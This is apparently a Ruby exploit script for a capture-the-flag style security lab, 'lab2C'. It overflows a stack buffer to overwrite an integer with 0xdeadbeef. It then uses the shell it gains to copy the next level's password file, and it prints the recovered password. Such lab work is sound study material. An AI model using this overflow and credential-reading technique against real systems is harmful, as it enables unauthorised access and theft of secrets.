# We can see the start of the buffer is at esp+0x2c while the int to overflow into, set_me, is stored at esp+0x1d.
# 0x2c - 0x1d = 15 as expected, as buffer is declared as 15 bytes wide.

payload = 'A' * (0x2c - 0x1d) + [0xdeadbeef].pack('<I')
flag = '/tmp/lab2B.pass'

%x{echo 'cat /home/lab2B/.pass > #{flag}' | /levels/lab02/lab2C '#{payload}'}
puts `cat #{flag}`


# Output:
# ---------------------------------------------------
# lab2C@warzone:/levels/lab02$ ruby /tmp/exploit2C.rb
# 1m_all_ab0ut_d4t_b33f
